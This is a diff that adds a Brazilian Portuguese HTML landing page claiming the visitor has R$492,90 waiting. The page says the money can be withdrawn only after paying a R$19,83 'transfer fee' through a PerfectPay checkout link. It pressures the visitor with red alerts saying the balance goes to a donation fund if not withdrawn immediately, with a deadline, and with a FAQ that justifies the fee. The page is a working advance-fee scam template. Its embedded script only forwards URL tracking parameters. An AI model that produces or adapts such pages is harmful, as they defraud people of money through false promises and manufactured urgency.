@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Página de Saque</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      color: #fff;
+      background-color: #000;
+    }
+
+    .alert-section {
+      background-color: red;
+      color: white;
+      padding: 15px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    .main-content {
+      padding: 20px;
+      background-color: #000;
+      color: white;
+      text-align: center;
+    }
+
+    .logo {
+      float: left;
+      margin-right: 10px;
+    }
+
+    .value {
+      float: right;
+      background-color: #333;
+      color: white;
+      font-size: 2em;
+      font-weight: bold;
+      padding: 10px 20px;
+      border-radius: 20px;
+    }
+
+    h1 {
+      color: #00ff00;
+      font-size: 2.5em;
+      margin: 20px 0;
+      text-align: center;
+      padding: 100px 0 20px 0;
+    }
+
+    .highlight-green {
+      color: #00ff00;
+      font-weight: bold;
+    }
+
+    .highlight-red {
+      color: #ff0000;
+      font-weight: bold;
+    }
+
+    .pulsing-button {
+      display: inline-block;
+      background-color: #00ff00;
+      color: black;
+      font-weight: bold;
+      padding: 15px 30px;
+      margin-top: 20px;
+      text-decoration: none;
+      border-radius: 5px;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+    }
+
+    .faq-section, .warning-section {
+      margin-top: 30px;
+      background-color: #222;
+      padding: 15px;
+      border-radius: 5px;
+    }
+
+    .footer {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 20px;
+      padding: 20px;
+      background-color: #111;
+    }
+
+    .footer img {
+      width: 80px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Seção de Alerta -->
+  <div class="alert-section">
+    ATENÇÃO: CASO NÃO SAQUE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!
+  </div>
+
+  <!-- Seção Principal -->
+  <div class="main-content">
+    <div class="logo">
+      <img src="https://i.postimg.cc/9QrDFsX8/image.webp" alt="Logo" width="100">
+    </div>
+    <div class="value">
+      R$ 492,90
+    </div>
+    <h1>Parabéns</h1>
+    <p>
+      Sua vaga está garantida! Temos uma <span class="highlight-green">taxa de transação bancária de R$ 19,83</span> para acessar o aplicativo. (OBRIGATÓRIA)
+    </p>
+    <p>
+      Para receber o seu saque total de <span class="highlight-green">R$492,90</span> imediatamente é necessário que pague apenas a <span class="highlight-red">taxinha de transferência</span> porque temos custos para fazer essa transação.
+    </p>
+    <p>
+      CLIQUE NO BOTÃO E receba SEU SAQUE DE <span class="highlight-green">R$492,90</span>
+    </p>
+    <a href="https://go.perfectpay.com.br/PPU38CP6U04" class="pulsing-button">PAGAR A TAXA E RECEBER VALOR</a>
+
+    <!-- Seção de Advertência -->
+    <div class="warning-section">
+      <h2>ATENÇÃO!</h2>
+      <p>Você pagou a taxa de cadastro de <span class="highlight-green">R$39,90</span>, que será reembolsada junto com seu saque de <span class="highlight-green">R$473,00</span> dentro do aplicativo. Total a receber dentro do app: <span class="highlight-green">R$492,90</span>.</p>
+      <p>Agora está pendente sua taxa de transferência de <span class="highlight-red">R$19,83</span>! E só será possível acessar o app e solicitar seu saque de <span class="highlight-green">R$492,90</span> após o pagamento da taxa.</p>
+    </div>
+
+    <!-- Seção FAQ -->
+    <div class="faq-section">
+      <h2>Dúvidas</h2>
+      <p><strong>– Por que tem essa taxa?</strong><br> A transação bancária gera custos para nossa empresa, além do seu saque. Então, infelizmente, temos que repassar para nossos usuários apenas o custo da transferência e nada mais.</p>
+      <p><strong>– Se eu não pagar a taxa?</strong><br> O cliente tem até o final do dia, após o suporte ter entrado em contato, para pagar. Caso não consiga, perderá sua vaga (VAGA NÃO É REEMBOLSÁVEL).</p>
+      <p><strong>– O que acontece após eu pagar?</strong><br> Automaticamente, é liberado o aplicativo e você poderá continuar avaliando e solicitar seu saque disponível.</p>
+    </div>
+  </div>
+
+  <!-- Seção de Rodapé -->
+  <div class="footer">
+    <img src="https://i.postimg.cc/c1tgSpHF/image.png" alt="Imagem 1">
+    <img src="https://i.postimg.cc/HsGJs68d/image.png" alt="Imagem 2">
+  </div>
+ <!-- Script Utms -->
+      <script>
+          function adicionarParametrosAosLinks() {
+              const urlParams = new URLSearchParams(window.location.search);
+
+              // Modificar os links <a> se houver
+              const links = document.querySelectorAll('a');
+              links.forEach(link => {
+                  const href = new URL(link.href);
+                  urlParams.forEach((value, key) => {
+                      href.searchParams.set(key, value);
+                  });
+                  link.href = href.toString();
+              });
+          }
+
+          // Função para redirecionar com parâmetros da URL atual e o e-mail preenchido
+          function abrirComParametros() {
+              const urlParams = new URLSearchParams(window.location.search);
+
+              // Captura o valor do campo de e-mail, se existir
+              const email = document.getElementById('email')?.value;
+              
+              // Adiciona o e-mail aos parâmetros da URL, caso esteja preenchido
+              if (email) {
+                  urlParams.set('email', email);
+              }
+
+              // Constrói a nova URL com os parâmetros
+              const novaUrl = '../front/?' + urlParams.toString();
+              
+              // Abre a URL com os parâmetros em uma nova aba
+              window.open(novaUrl, '_blank');
+          }
+
+          // Chama a função ao carregar a página
+          document.addEventListener('DOMContentLoaded', adicionarParametrosAosLinks);
+      </script>
+      <!-- Script Utms -->
+</body>
+</html>
